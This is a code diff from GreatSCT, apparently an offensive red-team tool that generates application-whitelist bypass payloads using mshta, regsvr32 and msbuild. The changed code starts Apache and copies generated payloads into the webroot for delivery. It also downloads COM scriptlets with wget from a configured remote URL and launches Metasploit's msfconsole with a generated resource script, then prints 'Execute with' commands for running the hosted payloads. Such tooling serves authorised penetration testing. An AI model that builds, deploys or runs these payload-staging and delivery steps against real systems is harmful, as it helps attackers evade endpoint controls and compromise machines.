@@ -335,6 +335,7 @@ class ConfigAllEdit(State):
         """
         Generates all the payloads from loaded configs
         """
+
         for i in self.configMap:
             if i["config"] not in ConfigAllEdit.generationIndex:
                 fileOps.setCurrentConfig(i["config"])
@@ -343,14 +344,15 @@ class ConfigAllEdit(State):
                 self.transition("generate")
         ConfigAllEdit.genInProgress = False
         ConfigAllEdit.generationIndex = []
+        generator.genUUIDTrackingResouceFile()
         os.system("service apache2 start >/dev/null 2>&1")
-        display.prompt("Starting Apache")
+        display.prompt("{0}Starting Apache{1}".format(display.GREEN, display.ENDC))
         os.system("zip -r ./GenerateAll/generateall.zip ./GenerateAll >/dev/null 2>&1")
-        display.prompt("Creating generateall.zip")
+        display.prompt("{0}Creating generateall.zip{1}".format(display.GREEN, display.ENDC))
         os.system("cp -rf ./GenerateAll /var/www/html/ >/dev/null 2>&1")
-        display.prompt("Copying files to Apache's webroot")
-        display.prompt("Generated all application whitelist bypasses in GreatSCT. Happy policy testing!")
-        display.prompt("Loading metasploit with \"msfconsole -r ./GenerateAll/gr8sct.rc\"")
+        display.prompt("{0}Copying files to Apache's webroot{1}".format(display.GREEN, display.ENDC))
+        display.prompt("{0}Generated all application whitelist bypasses in GreatSCT. Happy policy testing!{1}".format(display.GREEN, display.ENDC))
+        display.prompt("{0}Loading metasploit with:{1} \"msfconsole -r ./GenerateAll/gr8sct.rc\"".format(display.GREEN, display.ENDC))
         os.system("msfconsole -r ./GenerateAll/gr8sct.rc")
 
         self.transition("exit")
@@ -529,36 +531,53 @@ class GenerationPrompt(State):
             info = config["Type"]["runInfo"]
             output = config["Output"]["var"]
             name = config["Type"]["name"]
-            sct = config["Scriptlet"]["var"]
-            hostedsct = config["HostedSct"]["var"]
-        except:
+            if "allthethings" in output:
+                generator.compileAllTheThings(output)
+                info = info.replace('.cs', '.dll')
+        except KeyError:
             pass
 
         try:
             domain = config["HostedDomain"]["var"]
+
+            if domain:
+                if "GenerateAll" in info:
+                    info = info.replace(output, '"{0}/{1}"'.format(domain, output.replace("./", "")))
+                else:
+                    info = info.replace(output, '"{0}/{1}"'.format(domain, output))
+        except KeyError:
+            domain = False
+            pass
+
+        try:
+            hostedsct = config["HostedSct"]["var"]
         except KeyError:
             pass
 
-        if 'mshta' in info:
-            info = info.replace('./', domain + '/')
-            generator.genRunScript(info)
-            if 'HTA2Shell' in name:
-                os.system('wget -O ./GenerateAll/{0} {1} >/dev/null 2>&1'.format(hostedsct, sct))
-                display.prompt(
-                    "{0}Downloading COM Scriptlet here:{1} ./GenerateAll/{2}".format(display.GREEN, display.ENDC, hostedsct))
-        elif 'regsvr32' in info:
-            info = info.replace('./', domain + '/')
-            generator.genRunScript(info)
-        elif name == 'msbuild':
-            info = info.replace('./GenerateAll/shellcode.xml', 'shellcode.xml')
-            generator.genRunScript(info)
-        else:
-            generator.genRunScript(info)
+        try:
+            sct = config["Scriptlet"]["var"]
+            if sct:
+                if "GenerateAll" in info:
+                    os.system("wget -O ./GenerateAll/{0} {1} >/dev/null 2>&1".format(hostedsct, sct))
+                    os.system("cp ./GenerateAll/{0} /var/www/html/ >/dev/null 2>&1".format(hostedsct))
+                    display.prompt(
+                        "{0}Downloading COM Scriptlet here:{1} {2}".format(display.GREEN, display.ENDC, hostedsct))
+                else:
+                    os.system("wget -O {0} {1} >/dev/null 2>&1".format(hostedsct, output))
+                    display.prompt(
+                        "{0}Downloading COM Scriptlet here:{1} {2}".format(display.GREEN, display.ENDC, hostedsct))
+        except KeyError:
+            pass
 
-        if "allthethings" in output:
-            generator.compileAllTheThings(name)
+        if domain is False:
+            if "GenerateAll" in info:
+                print("info: " + info)
+                print("output: " + output.replace('./GenerateAll/', ''))
+                info = info.replace('./GenerateAll/', '')
+                print("genall: " + info)
 
-        generator.genUUIDTrackingResouceFile()
+        print(info)
+        generator.genRunScript(info)
 
         display.prompt("{0}Execute with: {1}".format(display.GREEN, display.ENDC), '')
         display.prompt(info, '\n\n')
